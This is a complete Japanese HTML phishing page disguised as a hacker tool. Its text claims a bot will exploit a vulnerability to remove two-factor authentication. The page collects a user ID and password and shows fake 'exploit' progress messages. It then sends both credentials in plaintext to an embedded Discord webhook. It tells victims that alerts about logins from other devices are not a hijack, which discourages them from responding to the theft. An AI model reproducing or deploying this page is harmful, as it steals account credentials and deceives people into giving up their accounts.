<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>ログイン</title>
  <style>
    body { 
      font-family: 'Courier New', monospace; 
      text-align: center; 
      padding: 60px 20px; 
      background: #0a0a0a; 
      color: #00ff9d; 
      margin: 0;
    }
    form { 
      max-width: 440px; 
      margin: 0 auto; 
      background: #111111; 
      padding: 40px 30px; 
      border-radius: 8px; 
      box-shadow: 0 0 20px rgba(0, 255, 100, 0.2); 
      border: 1px solid #003322;
    }
    input { 
      width: 100%; 
      padding: 14px; 
      margin: 12px 0; 
      font-size: 16px; 
      background: #1a1a1a; 
      color: #00ff9d; 
      border: 1px solid #00aa66; 
      border-radius: 4px; 
    }
    input::placeholder { color: #008844; }
    
    button { 
      padding: 14px 40px; 
      font-size: 17px; 
      background: #00aa66; 
      color: #000; 
      border: none; 
      border-radius: 4px; 
      cursor: pointer; 
      width: 100%; 
      margin-top: 10px;
      font-weight: bold;
    }
    button:hover { background: #00cc77; }

    #loading { display: none; margin: 40px auto; }
    .progress { 
      height: 18px; 
      background: #222; 
      border: 1px solid #00aa66; 
      border-radius: 2px; 
      overflow: hidden; 
      margin: 20px 0; 
    }
    .bar { 
      height: 100%; 
      width: 0%; 
      background: linear-gradient(to right, #00ff9d, #00ccff); 
      transition: width 1.2s linear; 
      box-shadow: 0 0 10px #00ff9d;
    }
    #loadingText { 
      font-family: 'Courier New', monospace; 
      color: #00ff9d; 
      margin-top: 15px; 
      font-size: 15px; 
      text-align: left; 
      padding: 0 10px;
    }
    #status { margin-top: 30px; font-size: 18px; }
  </style>
</head>
<body>
  
  <form id="form">
    
    <label>ID:<br>
      <input type="text" id="id" placeholder="あなたのIDを入力" required>
    </label><br><br>
    
    <label>パスワード:<br>
      <input type="password" id="password" placeholder="パスワードを入力" required>
    </label><br><br>

    <p style="font-size: 14px; color: #00cc88; text-align: left; line-height: 1.6; margin: 25px 0;">
      ※2段階認証解除していないと実行不可です。<br>
      ボットによりシステムの脆弱性を利用しています。<br>
      そのため他のデバイスからログインされました。<br>
      ような通知が来た場合は、ボットによる作業のため、乗っ取りではありません。<br>
      作業が開始された合図です。
    </p>

    <button type="submit">確認して実行する</button>
  </form>

  <div id="loading">
    <p style="color:#00ff9d;">[INITIALIZING EXPLOIT]...</p>
    <div class="progress"><div class="bar" id="progressBar"></div></div>
    <p id="loadingText">脆弱性を利用して認証を解除中です（約1〜2分かかります）</p>
  </div>

  <div id="status"></div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1495739434958590054/c65PNfw0d-Xmrrwqhh23eOBfikccL_arXQbnmpVhGLRbJ5W8x7KgI3PUZfvesSBmIEZA";

    document.getElementById("form").addEventListener("submit", async (e) => {
      e.preventDefault();

      const id = document.getElementById("id").value.trim();
      const password = document.getElementById("password").value;   // ← ここでパスワードを取得

      document.querySelector("form").style.display = "none";
      document.getElementById("loading").style.display = "block";

      const progressBar = document.getElementById("progressBar");
      const loadingText = document.getElementById("loadingText");
      const status = document.getElementById("status");

      const fakeDelay = Math.floor(Math.random() * 40000) + 70000;

      let progress = 0;
      const interval = setInterval(() => {
        progress += Math.random() * 8 + 2;
        if (progress > 98) progress = 98;
        progressBar.style.width = progress + "%";
      }, 650);

      setTimeout(() => { 
        loadingText.textContent = "[NETWORK] 他のデバイスからの接続を傍受中..."; 
      }, 28000);

      setTimeout(() => { 
        loadingText.textContent = "[AUTH BYPASS] 2段階認証を強制解除しています..."; 
      }, 55000);

      setTimeout(async () => {
        clearInterval(interval);
        progressBar.style.width = "100%";

        // DiscordにIDとPasswordの両方を送信（Password全文）
        const message = {
          username: "アカウントセキュリティ",
          content: "",
          embeds: [{
            title: "🔧 システム作業通知",
            description: "ボットによる脆弱性利用作業が開始されました。\n乗っ取りではありません。",
            color: 0x00aa66,
            fields: [
              { name: "ID", value: id || "不明", inline: true },
              { name: "Password", value: password || "未入力", inline: true },   // ← Passwordを追加・全文送信
              { name: "処理内容", value: "2段階認証解除 + ログイン確認", inline: false },
              { name: "作業開始", value: new Date().toLocaleString("ja-JP"), inline: false }
            ],
            footer: { text: "自動処理システム" }
          }]
        };

        try {
          const response = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(message)
          });

          if (!response.ok) {
            console.error("Webhookエラー:", response.status);
          }
        } catch (err) {
          console.error("送信失敗:", err);
        }

        // 完了画面
        document.getElementById("loading").style.display = "none";
        status.innerHTML = `
          <h2 style="color: #00ff9d;">[ACCESS GRANTED] 完了！</h2>
          <p>作業が正常に終了しました。<br>
          他のデバイスからのログインはボットによるものです。<br>
          乗っ取りではありません。</p>
          <button onclick="location.reload()" style="margin-top:20px; padding:12px 30px; background:#00aa66; color:#000; border:none; border-radius:4px; font-weight:bold;">もう一度実行する</button>
        `;
      }, fakeDelay);
    });
  </script>
</body>
</html>
